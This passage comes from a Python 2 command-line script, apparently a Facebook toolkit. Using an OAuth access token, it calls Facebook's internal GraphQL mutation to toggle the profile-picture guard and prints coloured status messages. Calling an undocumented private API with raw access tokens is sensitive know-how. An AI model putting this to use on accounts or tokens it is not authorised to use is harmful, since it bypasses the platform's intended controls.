    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']


def gaz(toket, enable=True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data=data, headers=headers)
    print res.text
    if '"is_shielded":true' in res.text:
        os.system('reset')
        print logo
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mActivate'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()
    elif '"is_shielded":false' in res.text:
        os.system('reset')
        print logo
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;91mNot activate'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()
    else:
        print '\x1b[1;91m[!] Error'
        menu()


if __name__ == '__main__':
    lisensi()
    login()
